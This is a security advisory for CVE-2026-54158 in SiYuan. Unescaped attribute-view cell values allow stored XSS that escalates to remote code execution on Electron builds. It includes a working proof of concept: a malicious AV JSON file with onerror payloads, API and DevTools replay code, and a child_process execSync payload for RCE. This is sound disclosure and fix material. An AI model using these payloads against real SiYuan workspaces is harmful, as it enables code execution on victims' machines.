# [C] SiYuan: Stored XSS to RCE via attribute-view cell rendering in genAVValueHTML()

## Summary
Severity: Critical
Advisory: GHSA-5xfx-xj4h-5p7r
CVE: CVE-2026-54158
CWE: CWE-1188, CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-5xfx-xj4h-5p7r
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260628153353-2d5d72223df4

## Details
### Summary

The attribute-view (database) cell renderer `genAVValueHTML` interpolates cell content raw in four of its branches: `text`, `url`, `phone`, and `mAsset`. A cell value like `</textarea><img src=x onerror="...">` or `"><img src=x onerror="...">` breaks out of its surrounding tag and runs arbitrary JavaScript in the renderer when the victim opens the block-attribute panel. On Electron desktop the renderer runs with `nodeIntegration:true`, so the XSS chains to host RCE via `require('child_process')`. AV files live under the workspace and ride normal sync, so an attacker with write access to any synced workspace plants the payload once and it fires on every device that opens a panel containing that row.

The kernel doesn't escape on the way in either, so the malicious cell persists byte-for-byte. There's no equivalent of the `html.EscapeAttrVal` call that protects block IAL attributes at `kernel/model/blockial.go:261`.

Companion advisory: GHSA-mvjr-vv3c-w4qv. Same workspace-sync to renderer-sink to Electron-RCE pattern in the CSS-snippet renderer, different sink file. Worth auditing for the same pattern in other renderers that pull from synced workspace data.

### Details

Affected:

- HEAD `96dfe0b` (v3.6.5, 2026-04-21)
- Renderer sink: `app/src/protyle/render/av/blockAttr.ts:68`, `genAVValueHTML()`. The text, url, phone, and mAsset branches interpolate cell content raw.
- Callsites piping `genAVValueHTML` into `innerHTML`: `select.ts:124,229,346`, `cell.ts:791,913,1198`, `col.ts:455,656,1256`, `filter.ts:199,471,609,702`, `groups.ts:56,289,328,378`, and `blockAttr.ts:212`.
- Source: cell values returned by `/api/av/getAttributeView`. Backing store: `data/storage/av/<avID>.json`.
- Write path: `kernel/model/attribute_view.go`, `updateAttributeViewValue` and `(*Transaction).doUpdateAttrViewCell`. No call to `html.EscapeAttrVal`, `html.EscapeString`, or `util.EscapeHTML` anywhere in the file.
- Electron config: `nodeIntegration:true`, `contextIsolation:false`, `webSecurity:false` on every `BrowserWindow` in `app/electron/main.js:307,408-411,1107-1110,1150-1153,1322`.

#### The sink

`app/src/protyle/render/av/blockAttr.ts:68`, with the unsafe branches highlighted:

```ts
export const genAVValueHTML = (value: IAVCellValue) => {
  let html = "";
  switch (value.type) {
    case "block":
      // escaped via escapeAttr — safe
      html = `<input ... value="${escapeAttr(value.block.content)}" ...>`;
      break;
    case "text":
      // value.text.content goes raw into a <textarea>
      html = `<textarea ... rows="${(value.text?.content || "").split("\n").length}" ...>${value.text?.content || ""}</textarea>`;
      break;
    case "url":
      // value.url.content goes raw into value="..." and href="..."
      html = `<input value="${value.url.content}" ...>
              <a ${value.url.content ? `href="${value.url.content}"` : ""} ...>`;
      break;
    case "phone":
      // same pattern as url
      html = `<input value="${value.phone.content}" ...>
              <a ${value.phone.content ? `href="tel:${value.phone.content}"` : ""} ...>`;
      break;
    case "mAsset":
      value.mAsset?.forEach(item => {
        if (item.type === "image") {
          // item.content raw inside aria-label
          html += `<img ... aria-label="${item.content}" src="${getCompressURL(item.content)}">`;
        } else {
          // attributes escaped, but ${item.name || item.content} text-node is raw
          html += `<span ... aria-label="${escapeAttr(item.content)}" data-name="${escapeAttr(item.name)}" data-url="${escapeAttr(item.content)}">${item.name || item.content}</span>`;
        }
      });
      break;
    // other cases use escapeHtml / escapeAttr correctly
  }
  return html;
};
```

`escapeHtml` and `escapeAttr` already exist and are used in the `block`, `select`, and `mSelect` cases. They just aren't applied in the four branches above.

Callers assign the result to `innerHTML`. Example, `app/src/protyle/render/av/select.ts:124`:

```ts
if (item.classList.contains("custom-attr__avvalue")) {
    item.innerHTML = genAVValueHTML(cellValue);
}
```

#### The write path

A grep for any HTML-escape call in `kernel/model/attribute_view.go` returns nothing:

```
grep -n 'html.Escape\|EscapeHTML\|EscapeString' kernel/model/attribute_view.go
# (no output)
```

For comparison, the block-IAL write path at `kernel/model/blockial.go:261` applies `html.EscapeAttrVal(value)`. The AV cell write path is missing the equivalent.

#### Storage and sync

AV files live at `data/storage/av/<avID>.json` and the repository sync picks them up the same way it does the rest of the workspace data. Any sync target propagates the malicious cell to all peers.

#### Suggested fix

The renderer-side fix is the more important one. `escapeHtml` and `escapeAttr` already exist in `blockAttr.ts` and already protect the `block`, `select`, and `mSelect` branches. Extend them to the rest of `genAVValueHTML`:

```ts
case "text":
  html = `<textarea ...>${escapeHtml(value.text?.content || "")}</textarea>`;
  break;
case "url":
  html = `<input value="${escapeAttr(value.url.content)}" ...>
          <a ${value.url.content ? `href="${escapeAttr(value.url.content)}"` : ""} ...>`;
  break;
case "phone":
  html = `<input value="${escapeAttr(value.phone.content)}" ...>
          <a ${value.phone.content ? `href="tel:${escapeAttr(value.phone.content)}"` : ""} ...>`;
  break;
case "mAsset":
  // escape item.name and item.content in the text-node positions, not just inside attributes
```

The `mAsset` image branch also interpolates `item.content` into the `src` attribute via `getCompressURL`. Worth rejecting `javascript:` and `data:` schemes for asset URLs while you're in there.

Backend side, defense in depth: in `kernel/model/attribute_view.go:updateAttributeViewValue`, call `html.EscapeAttrVal(content)` on the string-content cell types before persisting. This mirrors the existing protection in `kernel/model/blockial.go:261`. The renderer fix matters more because the backend fix doesn't retroactively neutralize payloads already sitting in synced workspaces.

### PoC

Stand up SiYuan and drop a malicious AV file at `workspace/data/storage/av/poc.json`:

```bash
docker run -d --name siyuan-poc \
  -v ./workspace:/siyuan/workspace \
  -p 16806:6806 \
  b3log/siyuan:latest \
  --workspace=/siyuan/workspace --accessAuthCode=hunter2
```

Minimum viable AV JSON:

```json
{
  "spec": 2,
  "id": "20260519999999-poctest",
  "name": "PocAV",
  "keyValues": [
    {
      "key": {"id": "...keyblok", "name": "Block", "type": "block"},
      "values": [{
        "id": "...row1blk", "keyID": "...keyblok", "blockID": "...row1blk",
        "type": "block", "isDetached": true,
        "block": {"id": "...row1blk", "content": "Row 1"}
      }]
    },
    {
      "key": {"id": "...keytext", "name": "TextField", "type": "text"},
      "values": [{
        "id": "...celltxt", "keyID": "...keytext", "blockID": "...row1blk",
        "type": "text",
        "text": {"content": "</textarea><img src=x onerror=\"window.__siyuan_av_xss='FIRED'\">"}
      }]
    },
    {
      "key": {"id": "...keyurl0", "name": "UrlField", "type": "url"},
      "values": [{
        "id": "...cellurl", "keyID": "...keyurl0", "blockID": "...row1blk",
        "type": "url",
        "url": {"content": "\"><img src=x onerror=\"window.__siyuan_av_url_xss='FIRED'\">"}
      }]
    }
  ]
}
```

In a real attack the file gets there via sync, not by hand.

Confirm the API returns the cell content raw:

```bash
TOKEN=$(jq -r '.api.token' workspace/conf/conf.json)

curl -s -X POST http://localhost:16806/api/av/getAttributeView \
  -H "Authorization: Token $TOKEN" \
  -d '{"id":"20260519999999-poctest"}' \
  | python3 -m json.tool | grep -E '"content":'
```

Output from my run on 2026-05-19:

```
"content": "</textarea><img src=x onerror=\"window.__siyuan_av_xss='FIRED'\">"
"content": "\"><img src=x onerror=\"window.__siyuan_av_url_xss='FIRED'\">"
```

`</textarea>` and `">` come back literal, no escape.

In the Siyuan renderer's DevTools:

```js
const res = await fetch('/api/av/getAttributeView', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({id: '20260519999999-poctest'})
});
const json = await res.json();

let textValue = null, urlValue = null;
for (const kv of json.data.av.keyValues) {
  for (const v of kv.values || []) {
    if (v.type === 'text' && v.text) textValue = v;
    if (v.type === 'url' && v.url) urlValue = v;
  }
}

// Replay the actual genAVValueHTML branches verbatim.
const textHTML = `<textarea rows="${(textValue.text?.content||'').split('\n').length}">${textValue.text?.content || ''}</textarea>`;
const urlHTML  = `<input value="${urlValue.url.content}">`;

const div = document.createElement('div');
div.innerHTML = textHTML + urlHTML;

await new Promise(r => setTimeout(r, 250));

console.log({
  textMarkerFired: window.__siyuan_av_xss === 'FIRED',
  urlMarkerFired: window.__siyuan_av_url_xss === 'FIRED',
  imgsInDiv: div.querySelectorAll('img').length,
  title: document.title
});
```

Output from my run:

```json
{
  "textMarkerFired": true,
  "urlMarkerFired": true,
  "imgsInDiv": 3,
  "title": "AV_TEXT_XSS_OK"
}
```

`</textarea>` and `">` both broke out, the smuggled `<img>` elements ran their `onerror` handlers, the marker variables got set, `document.title` got rewritten. Same code path the real panel takes when the user opens the block attributes on this row.

To turn it into RCE on Electron, swap the marker payload for:

```html
<img src=x onerror="require('child_process').execSync('open /Applications/Calculator.app')">
```

`require` is reachable from the renderer because of `nodeIntegration:true` in `app/electron/main.js:408`.

### Impact

Stored XSS to RCE on Electron desktop builds, plus XSS on mobile and Docker web builds.

The payload fires the next time the victim opens the block-attribute panel on a row containing the malicious cell. The panel opens on a cell click or via the gutter icon, which is normal database usage. No special interaction required.

Anyone affected by a workspace-write compromise is exposed. Realistic paths in: compromised SiYuan Cloud / S3 / WebDAV sync credentials, a workspace folder mounted on a shared filesystem (Dropbox, Syncthing, network share, git), or a multi-user Docker server where any authenticated user can call `/api/av/updateAttrViewCell`. Once the malicious AV cell is in the workspace, every peer that syncs and opens a panel touching that row runs the payload.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-5xfx-xj4h-5p7r
- https://nvd.nist.gov/vuln/detail/CVE-2026-54158
- https://github.com/siyuan-note/siyuan
